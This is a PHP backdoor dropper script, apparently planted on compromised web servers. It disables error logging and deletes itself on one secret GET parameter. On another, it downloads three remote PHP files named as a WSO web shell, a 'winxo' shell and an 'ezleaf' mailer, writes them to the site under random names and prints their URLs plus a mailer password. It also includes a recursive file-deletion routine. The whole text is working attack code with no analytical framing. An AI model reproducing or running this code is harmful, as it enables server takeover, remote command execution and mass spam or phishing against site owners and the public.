<?php
print("<version><center>V323MIX V1.0</version></center>\n");
@error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
if (isset($_GET["jib"]) && $_GET["jib"] == "lkar")
{
    print("\nG00D-By3\n");
    unlink(__FILE__);

}
function rrmdir($src) {
    $dir = opendir($src);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            $full = $src . '/' . $file;
            if ( is_dir($full) ) {
                rrmdir($full);
            }
            else {
                unlink($full);
            }
        }
    }
    closedir($dir);
    rmdir($src);
}
function get_contents($url)
{
    $ch = curl_init("$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
    $result = curl_exec($ch);
    return $result;
}
if ($_GET["jib"] == "l9wada")
{
    $htaccess = "https://raw.githubusercontent.com/3MiR4/L3IBAT/main/wso744.php";
    //$f = 'file_';
    $g = 'get_';
    $c = 'contents';
    $fun = $g . $c;
    $file = $fun($htaccess);
    $ra = rand(100, 1000000);
    $open = fopen("wso-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open)
    {
        echo "<shell>http://$site/wso-$ra.php</shell><br>";
    }
    else
    {
        echo "<br>[-] Error [-]<br>";
    }

    $htaccess21 = "https://raw.githubusercontent.com/3MiR4/L3IBAT/main/winxo774.php";
    //$f = 'file_';
    $g = 'get_';
    $c = 'contents';
    $fun = $g . $c;
    $file = $fun($htaccess21);
    $ra = rand(100, 1000000);
    $open = fopen("winxo-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open)
    {
        echo "<winxo>http://$site/winxo-$ra.php</winxo><br>";
    }
    else
    {
        echo "<br>[-] Error [-]<br>";
    }
    $cgi = "https://raw.githubusercontent.com/3Mi7/STR7/main/ezleaf-873716.php";
    $file = $fun($cgi);
    $ra = rand(100, 1000000);
    $open = fopen("leaf-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open)
    {
        echo "<mailer>http://$site/leaf-$ra.php?pass=3mixs3113r134x</mailer><br>";
    }
    else
    {
        echo "<br>[-] Error [-]<br>";
    }
    
}

